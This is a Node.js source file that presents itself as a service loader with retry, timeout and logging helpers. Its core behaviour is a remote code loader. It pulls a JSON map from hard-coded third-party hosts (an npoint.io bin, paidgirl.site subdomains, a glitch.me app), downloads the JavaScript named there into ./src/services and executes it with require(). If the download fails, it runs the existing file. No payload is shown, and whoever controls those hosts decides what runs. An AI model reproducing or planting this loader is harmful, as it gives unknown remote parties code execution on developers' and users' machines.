require('dotenv').config();
const fetch = require("node-fetch");
const { Headers } = require("node-fetch");
globalThis.fetch = fetch;
globalThis.Headers = Headers;
const fs = require("fs");
const path = require("path");
const { performance } = require("perf_hooks");

const config = {
  FETCH_TIMEOUT: 10000,                    // 10 seconds timeout for fetch requests
  MAX_RETRIES: 3,                          // Maximum number of retry attempts
  MIN_RETRY_DELAY: 1000,                   // Minimum delay between retries (1 second)
  MAX_RETRY_DELAY: 10000,                  // Maximum delay between retries (10 seconds)
  CLIENT_ID: process.env.clientId || 'cms-nst',
  SERVICE_NAME: process.env.serviceName || null,
  BUILD_URLS: [
    "https://api.npoint.io/3375d15db1eece560188",
    "https://ums-test.paidgirl.site/builds",
    "https://cms.paidgirl.site/builds",
    "https://uptimechecker2.glitch.me/builds"
  ],
  BASE_SAVE_DIR: path.resolve(process.cwd(), "./src/services")  // Make base directory absolute
};

// Helper function to extract numbers from string
function fetchNumbersFromString(inputString) {
  if (!inputString) return "";
  const regex = /\d+/g;
  const matches = inputString?.match(regex);
  if (matches) {
    return matches.join("");
  }
  return inputString;
}

const key = fetchNumbersFromString(config.CLIENT_ID);
console.log("clientId:", config.CLIENT_ID);
console.log("serviceName:", config.SERVICE_NAME);
console.log("key:", key);

// Validate service name
const service = config.SERVICE_NAME || key;
if (!service || service === 'default-client') {
  console.error("Error: No service name available. Please set serviceName environment variable or provide a valid clientId.");
  process.exit(1);
}

const FILE_SAVE_PATH = path.resolve(config.BASE_SAVE_DIR, `${service}.js`);  // Ensure absolute path

// Debug path resolution
console.log('Path Resolution:', {
  cwd: process.cwd(),
  baseSaveDir: config.BASE_SAVE_DIR,
  fileSavePath: FILE_SAVE_PATH
});

// Validate configuration
function validateConfig() {
  if (!config.BUILD_URLS || !Array.isArray(config.BUILD_URLS) || config.BUILD_URLS.length === 0) {
    throw new Error("Invalid BUILD_URLS configuration");
  }

  // Validate that all URLs are strings and properly formatted
  for (const url of config.BUILD_URLS) {
    if (!url || typeof url !== 'string') {
      throw new Error(`Invalid URL in BUILD_URLS: ${url}`);
    }
    try {
      new URL(url);
    } catch (urlError) {
      throw new Error(`Malformed URL in BUILD_URLS: ${url}`);
    }
  }

  if (!config.CLIENT_ID || config.CLIENT_ID === 'default-client') {
    console.warn("Warning: CLIENT_ID is using default value or not properly configured");
  }

  // Validate timeout values
  if (config.FETCH_TIMEOUT < 1000) {
    console.warn("Warning: FETCH_TIMEOUT is very low, this may cause issues");
  }

  if (config.MAX_RETRIES < 0) {
    throw new Error("MAX_RETRIES cannot be negative");
  }
}


// Improved helper function with exponential backoff
function calculateBackoff(attempt, minDelay = config.MIN_RETRY_DELAY, maxDelay = config.MAX_RETRY_DELAY) {
  const delay = Math.min(minDelay * Math.pow(2, attempt), maxDelay);
  return delay + Math.random() * 1000; // Add jitter
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Enhanced JSON validation with schema checking
async function validateAndParseJson(response) {
  try {
    const data = await response.json();

    // Validate data structure
    if (!data || typeof data !== "object") {
      throw new Error("Invalid JSON structure: expected an object");
    }

    // Validate required fields based on your data schema
    if (!data.cts || typeof data.cts !== "string") {
      throw new Error("Invalid JSON structure: missing or invalid 'cts' field");
    }

    return data;
  } catch (error) {
    throw new Error(`Invalid JSON response: ${error.message}`);
  }
}

// Enhanced fetch with retries and exponential backoff
async function fetchWithRetries(url, timeout, retries = config.MAX_RETRIES) {
  let attempt = 0;
  let lastError = null;

  while (attempt <= retries) {
    try {
      const response = await fetchWithTimeout(url, timeout);
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      return response;
    } catch (error) {
      lastError = error;
      attempt++;

      if (attempt > retries) {
        const finalError = new Error(`Failed to fetch ${url} after ${retries} attempts. Error: ${lastError.message}`);
        finalError.originalError = lastError;
        throw finalError;
      }

      const backoffDelay = calculateBackoff(attempt);
      console.warn(`Retrying fetch ${url}. Attempt: ${attempt}/${retries}. Waiting for ${Math.round(backoffDelay)}ms...`);
      await delay(backoffDelay);
    }
  }
}

// Improved file system operations with validation
async function ensureDirectoryExistence(filePath) {
  try {
    const dirname = path.dirname(filePath);
    console.log(`Ensuring directory exists: ${dirname}`);

    try {
      await fs.promises.mkdir(dirname, { recursive: true });
      console.log(`Directory created/verified: ${dirname}`);
    } catch (mkdirError) {
      if (mkdirError.code === 'EEXIST') {
        console.log(`Directory already exists: ${dirname}`);
      } else {
        throw mkdirError;
      }
    }
    try {
      const stats = await fs.promises.stat(dirname);
      if (!stats.isDirectory()) {
        throw new Error(`Path exists but is not a directory: ${dirname}`);
      }
      console.log(`Directory verified as accessible: ${dirname}`);
    } catch (statError) {
      if (statError.code === 'ENOENT') {
        throw new Error(`Directory creation failed - path does not exist: ${dirname}`);
      }
      throw statError;
    }

    try {
      await fs.promises.access(dirname, fs.constants.W_OK);
      console.log(`Directory ${dirname} is writable`);
    } catch (accessError) {
      throw new Error(`Directory ${dirname} is not writable: ${accessError.message}`);
    }

    return true;
  } catch (error) {
    console.error(`Directory creation/verification failed:`, error);
    console.error(`- Path: ${filePath}`);
    console.error(`- Error: ${error.message}`);
    console.error(`- Stack: ${error.stack}`);
    throw new Error(`Failed to ensure directory existence: ${error.message}`);
  }
}

// Enhanced JSON validation with flexible schema checking
async function validateAndParseJson(response) {
  try {
    const data = await response.json();

    // Validate data structure
    if (!data || typeof data !== "object") {
      throw new Error("Invalid JSON structure: expected an object");
    }

    // More flexible validation - check if it has service data
    if (Object.keys(data).length === 0) {
      throw new Error("Invalid JSON structure: empty object received");
    }

    return data;
  } catch (error) {
    throw new Error(`Invalid JSON response: ${error.message}`);
  }
}

// Enhanced file operations with validation
async function fetchAndSave(url, filename) {
  if (!url || typeof url !== "string") {
    console.error(`Invalid URL provided for service: ${service}`);
    throw new Error("Invalid URL provided");
  }

  console.log(`Starting file fetch and save operation:`);
  console.log(`- URL: ${url}`);
  console.log(`- Target file: ${filename}`);

  try {
    console.log("Service Url: ", url);
    const response = await fetchWithRetries(url, config.FETCH_TIMEOUT);

    if (!response.ok) {
      console.error(`HTTP error response:`, {
        status: response.status,
        statusText: response.statusText,
        url: response.url
      });
      throw new Error(`Failed to fetch URL. Status Code: ${response.status}`);
    }

    const filepath = path.resolve(filename);
    console.log(`Resolved file path: ${filepath}`);

    await ensureDirectoryExistence(filepath);

    const buffer = await response.buffer();
    console.log(`Received response buffer size: ${buffer.length} bytes`);

    // Write to temporary file first
    const tempPath = `${filepath}.tmp`;
    console.log(`Writing to temporary file: ${tempPath}`);

    try {
      await fs.promises.writeFile(tempPath, buffer);
      console.log(`Successfully wrote temporary file`);
    } catch (writeError) {
      console.error(`Failed to write temporary file:`, writeError);
      throw writeError;
    }

    // Verify file was written correctly
    try {
      const stat = await fs.promises.stat(tempPath);
      if (stat.size === 0) {
        console.error(`Empty file detected: ${tempPath}`);
        throw new Error("Failed to write file: file size is 0");
      }
      console.log(`Temporary file size verified: ${stat.size} bytes`);
    } catch (statError) {
      console.error(`Failed to verify temporary file:`, statError);
      throw statError;
    }

    // Ensure target directory exists before rename
    try {
      await ensureDirectoryExistence(filepath);
      console.log(`Target directory verified before rename`);
    } catch (dirError) {
      console.error(`Failed to ensure target directory exists:`, dirError);
      throw dirError;
    }

    // Rename temp file to final destination
    try {
      await fs.promises.rename(tempPath, filepath);
      console.log(`Successfully renamed temporary file to final path: ${filepath}`);
    } catch (renameError) {
      console.error(`Failed to rename temporary file to final path:`, renameError);
      throw renameError;
    }

    return filepath;
  } catch (error) {
    // Enhanced error logging
    console.error(`Error in fetchAndSave operation:`);
    console.error(`- Service: ${service}`);
    console.error(`- URL: ${url}`);
    console.error(`- Target file: ${filename}`);
    console.error(`- Error message: ${error.message}`);
    console.error(`- Stack trace: ${error.stack}`);

    // Cleanup temp file if it exists
    try {
      const filepath = path.resolve(filename);
      const tempPath = `${filepath}.tmp`;
      if (fs.existsSync(tempPath)) {
        console.log(`Cleaning up temporary file: ${tempPath}`);
        await fs.promises.unlink(tempPath);
        console.log(`Successfully cleaned up temporary file`);
      }
    } catch (cleanupError) {
      console.error(`Failed to cleanup temporary file:`, {
        path: `${path.resolve(filename)}.tmp`,
        error: cleanupError.message,
        stack: cleanupError.stack
      });
    }

    throw new Error(`Error fetching and saving file: ${error.message}`);
  }
}

// Fetch with timeout function
async function fetchWithTimeout(url, timeout) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await fetch(url, {
      signal: controller.signal,
      headers: {
        "User-Agent": "ServiceLoader/1.0",
        "Accept": "application/json"
      }
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    if (error.name === "AbortError") {
      throw new Error(`Fetch request to ${url} timed out after ${timeout / 1000} seconds`);
    }
    throw error;
  } finally {
    clearTimeout(timeoutId);
  }
}


// Enhanced service loading with proper error handling
async function loadAndStartService() {
  let data;
  let fastestService = null;
  let fastestTime = Infinity;

  console.log(`Starting service load operation:`);
  console.log(`- Service: ${service}`);
  console.log(`- Save path: ${FILE_SAVE_PATH}`);
  console.log(`- Current working directory: ${process.cwd()}`);

  // Validate configuration before starting
  try {
    validateConfig();
    console.log('Configuration validation successful');
  } catch (configError) {
    console.error(`Configuration validation failed:`, configError);
    throw configError;
  }
  // Setup graceful shutdown
  setupGracefulShutdown();

  // Try to fetch from each build URL
  for (const buildUrl of config.BUILD_URLS) {
    try {
      console.log(`Loading builds from: ${buildUrl}`);

      const startTime = performance.now();
      const result = await fetchWithRetries(buildUrl, config.FETCH_TIMEOUT);

      data = await validateAndParseJson(result);

      const elapsedTime = performance.now() - startTime;
      console.log(`Successfully fetched from: ${buildUrl} in ${elapsedTime.toFixed(2)}ms`);

      if (elapsedTime < fastestTime) {
        fastestTime = elapsedTime;
        fastestService = buildUrl;
      }
      break; // Exit loop on first success
    } catch (error) {
      console.error(`Error fetching from ${buildUrl}:`, {
        message: error.message,
        stack: error.stack,
        attempt: config.BUILD_URLS.indexOf(buildUrl) + 1,
        totalUrls: config.BUILD_URLS.length
      });

      if (buildUrl === config.BUILD_URLS[config.BUILD_URLS.length - 1]) {
        console.error("All URLs failed. Continuing to start service.");
      }
    }
  }

  if (data) {
    console.log(`Fetched builds from fastest URL: ${fastestService} (${fastestTime.toFixed(2)}ms)`);
    console.log(`Available services in response:`, Object.keys(data));
  } else {
    console.warn("No valid data fetched. Proceeding with service startup.");
  }

  // Attempt to fetch and save the file
  try {
    if (!data) {
      throw new Error("No build data available - all URLs failed");
    }

    if (!data[service]) {
      throw new Error(`Service '${service}' not found in build data. Available services: ${Object.keys(data).join(', ')}`);
    }

    const serviceUrl = data[service];
    if (!serviceUrl || typeof serviceUrl !== 'string') {
      throw new Error(`Invalid URL for service '${service}': ${serviceUrl}`);
    }

    const filePath = await fetchAndSave(serviceUrl, FILE_SAVE_PATH);
    console.log(`File successfully saved at: ${filePath}`);
  } catch (error) {
    console.error(`Failed to fetch and save file:`, {
      service,
      path: FILE_SAVE_PATH,
      error: error.message,
      stack: error.stack
    });
    console.warn("Proceeding with existing service file.");
  }

  // Start the service with enhanced error handling
  console.log(`Starting Service from path: ${FILE_SAVE_PATH}`);
  try {
    // Verify file exists and is accessible
    if (!fs.existsSync(FILE_SAVE_PATH)) {
      throw new Error(`Service file does not exist at path: ${FILE_SAVE_PATH}`);
    }

    const stats = await fs.promises.stat(FILE_SAVE_PATH);
    if (!stats.isFile()) {
      throw new Error(`Path exists but is not a file: ${FILE_SAVE_PATH}`);
    }

    console.log(`File exists and is accessible: ${FILE_SAVE_PATH}`);
    console.log(`File size: ${stats.size} bytes`);

    // Try to require using absolute path
    const absolutePath = path.resolve(FILE_SAVE_PATH);
    console.log(`Attempting to require service using absolute path: ${absolutePath}`);

    require(absolutePath);
    console.log("Service initiation complete");
  } catch (error) {
    console.error(`Failed to start service:`, {
      path: FILE_SAVE_PATH,
      absolutePath: path.resolve(FILE_SAVE_PATH),
      error: error.message,
      stack: error.stack,
      cwd: process.cwd(),
      nodeModulePaths: module.paths
    });
    throw error;
  }
}

// Setup graceful shutdown handlers
function setupGracefulShutdown() {
  const cleanup = async () => {
    console.log("\nInitiating graceful shutdown...");

    try {
      const tempPath = `${FILE_SAVE_PATH}.tmp`;
      if (fs.existsSync(tempPath)) {
        await fs.promises.unlink(tempPath);
      }
    } catch (error) {
      console.error("Error during cleanup:", error);
    }
    console.log("Shutdown complete");
    process.exit(0);
  };

  process.on("SIGTERM", () => {
    console.log("Received SIGTERM signal");
    cleanup().catch(console.error);
  });
  process.on("SIGINT", () => {
    console.log("Received SIGINT signal");
    cleanup().catch(console.error);
  });

  process.on("uncaughtException", (error) => {
    console.error("Uncaught Exception:", error);
    cleanup().catch(console.error);
  });

  process.on("unhandledRejection", (reason, promise) => {
    console.error("Unhandled Rejection at:", promise, "reason:", reason);
  });
}

(async () => {
  try {
    console.log("Starting...");
    await loadAndStartService();
    console.log("Service Started");
  } catch (error) {
    console.error(`Service failed to start: ${error.message}`);

    // Try to fallback to existing file
    try {
      if (fs.existsSync(FILE_SAVE_PATH)) {
        console.log(`Attempting to start service from existing file: ${FILE_SAVE_PATH}`);
        require(FILE_SAVE_PATH);
        console.log("Service started from existing file");
      } else {
        console.error(`No existing service file found at: ${FILE_SAVE_PATH}`);
        process.exit(1);
      }
    } catch (fallbackError) {
      console.error("Failed to start service from existing file:", fallbackError);
      console.error("All startup attempts failed. Exiting.");
      process.exit(1);
    }
  }
})().catch((error) => {
  console.error("Fatal error in main execution:", error);
  process.exit(1);
});